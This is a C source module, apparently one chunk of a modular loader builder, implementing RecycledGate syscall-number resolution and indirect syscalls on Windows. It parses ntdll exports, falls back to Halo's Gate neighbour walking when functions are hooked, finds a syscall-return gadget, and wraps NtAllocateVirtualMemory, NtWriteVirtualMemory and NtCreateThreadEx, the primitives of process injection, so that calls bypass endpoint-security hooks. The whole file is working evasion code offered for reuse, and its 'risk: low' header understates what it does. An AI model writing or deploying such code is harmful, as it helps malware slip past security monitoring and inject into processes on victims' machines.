// chunk: evasion/recycled_gate
// depends: (none)
// provides: init_indirect_syscalls, indirect_NtAllocateVirtualMemory, indirect_NtWriteVirtualMemory, indirect_NtCreateThreadEx, indirect_NtQuerySystemInformation
// headers: windows.h
// risk: low
// note: RecycledGate (FreshyCalls hybrid) — sorts Zw* exports by RVA for SSN ordering (like Tartarus Gate), then falls back to Halo's Gate neighbor walking if the target function can't be found in the Zw* list. Most robust SSN resolution: handles both full hooking and missing Zw* stubs.

#ifndef CHUNK_RECYCLED_GATE
#define CHUNK_RECYCLED_GATE

static DWORD ssn_NtAllocateVirtualMemory = 0;
static DWORD ssn_NtWriteVirtualMemory = 0;
static DWORD ssn_NtCreateThreadEx = 0;
static DWORD ssn_NtQuerySystemInformation = 0;
static void *syscall_ret_gadget = NULL;

typedef struct {
    DWORD rva;
    DWORD ordinal;
    char name[64];
} rg_stub_t;

static void rg_sort_stubs(rg_stub_t *arr, DWORD count) {
    for (DWORD i = 0; i < count - 1; i++) {
        for (DWORD j = i + 1; j < count; j++) {
            if (arr[j].rva < arr[i].rva) {
                rg_stub_t tmp = arr[i];
                arr[i] = arr[j];
                arr[j] = tmp;
            }
        }
    }
}

static int rg_str_eq(const char *a, const char *b) {
    while (*a && *b) { if (*a++ != *b++) return 0; }
    return *a == *b;
}

static int rg_is_clean_stub(BYTE *code) {
    return (code[0] == 0x4C && code[1] == 0x8B && code[2] == 0xD1 && code[3] == 0xB8);
}

static DWORD rg_resolve_ssn(HMODULE ntdll, const char *func_name) {
    BYTE *base = (BYTE *)ntdll;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    DWORD exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exp_rva) return 0;

    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(base + exp_rva);
    DWORD *names = (DWORD *)(base + exp->AddressOfNames);
    WORD *ords = (WORD *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);

    // Phase 1: Sort all Zw* exports by RVA
    rg_stub_t stubs[512];
    DWORD count = 0;

    for (DWORD i = 0; i < exp->NumberOfNames && count < 512; i++) {
        char *name = (char *)(base + names[i]);
        if (name[0] == 'Z' && name[1] == 'w') {
            stubs[count].rva = funcs[ords[i]];
            stubs[count].ordinal = ords[i];
            int k = 0;
            for (; name[k] && k < 63; k++) stubs[count].name[k] = name[k];
            stubs[count].name[k] = '\0';
            count++;
        }
    }

    if (count > 1) rg_sort_stubs(stubs, count);

    // Build target Zw name from Nt name: NtXxx -> ZwXxx
    char zw_name[64] = {'Z', 'w', 0};
    for (int i = 2; func_name[i] && i < 62; i++)
        zw_name[i] = func_name[i];
    zw_name[63] = '\0';

    for (DWORD i = 0; i < count; i++) {
        if (rg_str_eq(stubs[i].name, zw_name))
            return i;  // Position in sorted array = SSN
    }

    // Phase 2: Halo's Gate fallback — walk neighbors of the Nt function
    DWORD target_idx = (DWORD)-1;
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        if (rg_str_eq((char *)(base + names[i]), func_name)) {
            target_idx = i;
            break;
        }
    }
    if (target_idx == (DWORD)-1) return 0;

    BYTE *target_code = base + funcs[ords[target_idx]];
    if (rg_is_clean_stub(target_code))
        return *(DWORD *)(target_code + 4);

    for (int dist = 1; dist < 500; dist++) {
        if (target_idx + dist < exp->NumberOfNames) {
            char *n = (char *)(base + names[target_idx + dist]);
            if (n[0] == 'N' && n[1] == 't') {
                BYTE *c = base + funcs[ords[target_idx + dist]];
                if (rg_is_clean_stub(c))
                    return *(DWORD *)(c + 4) - dist;
            }
        }
        if (target_idx >= (DWORD)dist) {
            char *n = (char *)(base + names[target_idx - dist]);
            if (n[0] == 'N' && n[1] == 't') {
                BYTE *c = base + funcs[ords[target_idx - dist]];
                if (rg_is_clean_stub(c))
                    return *(DWORD *)(c + 4) + dist;
            }
        }
    }

    return 0;
}

static void *rg_find_gadget(HMODULE ntdll) {
    BYTE *base = (BYTE *)ntdll;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            BYTE *start = base + sec[i].VirtualAddress;
            DWORD size = sec[i].Misc.VirtualSize;
            for (DWORD j = 0; j < size - 2; j++) {
                if (start[j] == 0x0F && start[j + 1] == 0x05 && start[j + 2] == 0xC3)
                    return (void *)(start + j);
            }
        }
    }
    return NULL;
}

static int init_indirect_syscalls(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    ssn_NtAllocateVirtualMemory = rg_resolve_ssn(ntdll, "NtAllocateVirtualMemory");
    ssn_NtWriteVirtualMemory    = rg_resolve_ssn(ntdll, "NtWriteVirtualMemory");
    ssn_NtCreateThreadEx        = rg_resolve_ssn(ntdll, "NtCreateThreadEx");
    ssn_NtQuerySystemInformation = rg_resolve_ssn(ntdll, "NtQuerySystemInformation");
    syscall_ret_gadget = rg_find_gadget(ntdll);

    return (syscall_ret_gadget != NULL) ? 1 : 0;
}

__attribute__((naked))
static NTSTATUS indirect_NtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtAllocateVirtualMemory(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

__attribute__((naked))
static NTSTATUS indirect_NtWriteVirtualMemory(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtWriteVirtualMemory(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

__attribute__((naked))
static NTSTATUS indirect_NtCreateThreadEx(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
    ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize,
    SIZE_T MaximumStackSize, PVOID AttributeList) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtCreateThreadEx(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

__attribute__((naked))
static NTSTATUS indirect_NtQuerySystemInformation(
    ULONG SystemInformationClass, PVOID SystemInformation,
    ULONG SystemInformationLength, PULONG ReturnLength) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtQuerySystemInformation(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

#endif
